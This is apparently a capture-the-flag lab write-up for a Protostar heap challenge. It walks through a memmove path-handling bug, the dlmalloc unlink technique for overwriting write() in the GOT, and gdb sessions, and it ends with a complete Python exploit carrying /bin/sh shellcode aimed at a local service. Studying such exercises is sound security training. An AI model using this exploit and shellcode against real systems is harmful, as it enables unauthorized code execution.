- Source Code Analysis

  ```
  void check_path(char *buf)
  {
    char *start;
    char *p;
    int l;

    /*
    * Work out old software bug
    */

    p = rindex(buf, '/');
    l = strlen(p);
    if(p) {
        start = strstr(buf, "ROOT");
        if(start) {
            while(*start != '/') start--;
            memmove(start, p, l);
            printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
            "yes" : "no", start - buf);
        }
    }
  }
  ```
  
  1. `p = rindex(buf, '/');` returns pointer to the last occurence of `/`
  
     ```
     Given /lol/ROOT/blah, return pointer to /lol/ROOT/blah
                                                      ^
                                                      |
                                                pointer here
     ```

  2. `l = strlen(p);` gets the length of the value that p is pointing to (i.e. length of `blah` in this context but it would refer to the length of the string after the last `/`)

  3. `start = strstr(buf, "ROOT");` finds the STARTING index of the substring of `ROOT`

  4. `while(*start != '/') start--;` decrement start variable till it finds the first `/` before `ROOT`
  
  5. `memmove(start, p, l);` moves the data starting from the starting address pointed by `p` to the ending address indicated by `l` to the memory address pointed by the `start` pointer (i.e. `/lol/ROOT/blah` &rarr; `/lol/blah/blah`

  ```
  int get_requests(int fd)
  {
    char *buf;
    char *destroylist[256];
    int dll;
    int i;

    dll = 0;
    while(1) {
        if(dll >= 255) break;

        buf = calloc(REQSZ, 1);
        if(read(fd, buf, REQSZ) != REQSZ) break;

        if(strncmp(buf, "FSRD", 4) != 0) break;

        check_path(buf + 4);     

        dll++;
    }

    for(i = 0; i < dll; i++) {
                  write(fd, "Process OK\n", strlen("Process OK\n"));
        free(destroylist[i]);
    }
  }
  ```

  1. `buf = calloc(REQSZ, 1);` allocates 256 bytes of memory in heap and returns pointer to `buf`

  2. `if(read(fd, buf, REQSZ) != REQSZ) break;` ensures that the input we are reading is 256 bytes long

  3. `if(strncmp(buf, "FSRD", 4) != 0) break;` ensures that the 1st 4 chars of our input is equal to FSRD

- Exploit methodology: unsafe code + `memmove()` which calls `free()`

  1. Realise that during the while-loop in search of the first `/` after the last `/`, if we do not specify a proper path (e.g. `AAAAROOTBBBB/CCCC`) then the function will continue to look through the buffer behind the input and only stop at the first `/` it finds, before performing a memmove() and overwriting that segment of the buffer with `/CCCC` from our original input.

  2. We can send 2 payloads, one with slashes and one with data. The first payload will inject the heap with slashes. The second payload will crafted in a way whereby the while-loop will reach the slashes as injected by the first payload
  
  3. After the while-loop chunk exits, we will iterate through a for loop and start to write "Process OK" messages and free our heap
  
      ```
      for(i = 0; i < dll; i++) {
        write(fd, "Process OK\n", strlen("Process OK\n"));
        free(destroylist[i]);
      }
      ```
      
  4. What you have to do now is that using the free() function call on the first iteration of the for-loop, we have to overwrite the write function in the GOT table to redirect code execution as we did in heap3 such that on the second iteration of the for-loop (there will be 2 iterations since we sent 2 payloads), we will be able to call our redirected code when the write() function is called as it has already been overwritten by the initial first free() function call.
  
- Analyzing the _int_free() function call within the malloc.c source code:

    ```
    ...
    else if (!chunk_is_mmapped(p)) {
    nextchunk = chunk_at_offset(p, size);
    nextsize = chunksize(nextchunk);
    assert(nextsize > 0);

    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(p, bck, fwd);
    }

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        unlink(nextchunk, bck, fwd);
        size += nextsize;
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);

    ...
    ```

    - Given that the size memory address of the first chunk we are freeing is at 0x89, we skip the first if-block as the prev-inuse bit is set (last bit)

    - We then check whether the next chunk is in use or not. It should not be in use as the program will refer look at the size of the next next chunk located at 0x804e08c - 0x4 (same as 0x804e08c + 0xfffffffc) which should also be a 0xfffffffc. All of this is a result of abusing and exploiting the poorly written code where memmove() is called.

    - As the next chunk is not in use, we will unlink the next chunk and thereby successfully abusing the dlmalloc unlink() exploit

    - Once we can redirect code execution to different sections of our heap, we can inject shellcode in our first payload and use the unlink() exploit to overwrite the write function in the GOT table to point to the beginning address of the shellcode in our first payload













Given FSRD/ROOTAAAAA.....

(gdb) info registers
eax            0x804e00c	134537228
ecx            0x52	82
edx            0x804e00c	134537228
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff830	0xbffff830
ebp            0xbffff858	0xbffff858
esi            0x0	0
edi            0x0	0
eip            0x804bd40	0x804bd40 <check_path+112>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x $eax
0x804e00c:	0x4f4f522f
(gdb) x $esp
0xbffff830:	0x0804e00c
(gdb) x 0x0804e00c
0x804e00c:	0x4f4f522f

0x4f4f522f translates to /ROO

(gdb) disassemble check_path
Dump of assembler code for function check_path:
0x0804bcd0 <check_path+0>:	push   ebp
0x0804bcd1 <check_path+1>:	mov    ebp,esp
0x0804bcd3 <check_path+3>:	sub    esp,0x28
0x0804bcd6 <check_path+6>:	mov    DWORD PTR [esp+0x4],0x2f
0x0804bcde <check_path+14>:	mov    eax,DWORD PTR [ebp+0x8]
0x0804bce1 <check_path+17>:	mov    DWORD PTR [esp],eax
0x0804bce4 <check_path+20>:	call   0x8048f7c <rindex@plt>
0x0804bce9 <check_path+25>:	mov    DWORD PTR [ebp-0x10],eax
0x0804bcec <check_path+28>:	mov    eax,DWORD PTR [ebp-0x10]
0x0804bcef <check_path+31>:	mov    DWORD PTR [esp],eax
0x0804bcf2 <check_path+34>:	call   0x8048edc <strlen@plt>
0x0804bcf7 <check_path+39>:	mov    DWORD PTR [ebp-0xc],eax
0x0804bcfa <check_path+42>:	cmp    DWORD PTR [ebp-0x10],0x0
0x0804bcfe <check_path+46>:	je     0x804bd45 <check_path+117>
0x0804bd00 <check_path+48>:	mov    DWORD PTR [esp+0x4],0x804c2cc
0x0804bd08 <check_path+56>:	mov    eax,DWORD PTR [ebp+0x8]
0x0804bd0b <check_path+59>:	mov    DWORD PTR [esp],eax
0x0804bd0e <check_path+62>:	call   0x8048f4c <strstr@plt>
0x0804bd13 <check_path+67>:	mov    DWORD PTR [ebp-0x14],eax
0x0804bd16 <check_path+70>:	cmp    DWORD PTR [ebp-0x14],0x0
0x0804bd1a <check_path+74>:	je     0x804bd45 <check_path+117>
0x0804bd1c <check_path+76>:	jmp    0x804bd22 <check_path+82>
0x0804bd1e <check_path+78>:	sub    DWORD PTR [ebp-0x14],0x1
0x0804bd22 <check_path+82>:	mov    eax,DWORD PTR [ebp-0x14]
0x0804bd25 <check_path+85>:	movzx  eax,BYTE PTR [eax]
0x0804bd28 <check_path+88>:	cmp    al,0x2f
0x0804bd2a <check_path+90>:	jne    0x804bd1e <check_path+78>
0x0804bd2c <check_path+92>:	mov    eax,DWORD PTR [ebp-0xc]
0x0804bd2f <check_path+95>:	mov    DWORD PTR [esp+0x8],eax
0x0804bd33 <check_path+99>:	mov    eax,DWORD PTR [ebp-0x10]
0x0804bd36 <check_path+102>:	mov    DWORD PTR [esp+0x4],eax
0x0804bd3a <check_path+106>:	mov    eax,DWORD PTR [ebp-0x14]
0x0804bd3d <check_path+109>:	mov    DWORD PTR [esp],eax
0x0804bd40 <check_path+112>:	call   0x8048f8c <memmove@plt>
0x0804bd45 <check_path+117>:	leave  
0x0804bd46 <check_path+118>:	ret    
End of assembler dump.

memmove() references esp registers for its parameters




(gdb) x 0x8048dfc
0x8048dfc <write@plt>:	0xd41c25ff
(gdb) disassemble 0x8048dfc
Dump of assembler code for function write@plt:
0x08048dfc <write@plt+0>:	jmp    DWORD PTR ds:0x804d41c
0x08048e02 <write@plt+6>:	push   0x68
0x08048e07 <write@plt+11>:	jmp    0x8048d1c
End of assembler dump.



>>> 0x804d41c - 0x12
134534154
>>> hex(134534154)
'0x804d40a'










import socket
import struct
import time
import telnetlib

HOST="127.0.0.1"
PORT=2993

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

_WRITE=struct.pack("I", 0x804d41c-0xc)
_HEAP=struct.pack("I", 0x804e020)
_EXPLOIT="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
_NOPS="\x90"*10

def pad(_input, _char):
    temp = "FSRD" + _input
    return temp + (128 - len(temp)) * _char


s.send(pad("/ROOT/AAAABBBBCCCCDD" + _NOPS + _EXPLOIT, "/"))
s.send(pad("ROOT/" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + _WRITE + _HEAP,"\x00"))
s.send("BREAK THIS") # strange behaviour, when run as it is Process OK printed only once, when run with debugger printed thrice

t = telnetlib.Telnet()
t.sock = s
t.interact()






root@protostar:/home/user# cat .gdbinit 
set disassembly-flavor intel
set follow-fork-mode child
set pagination off

break *0x0804bd40
break *0x0804be13
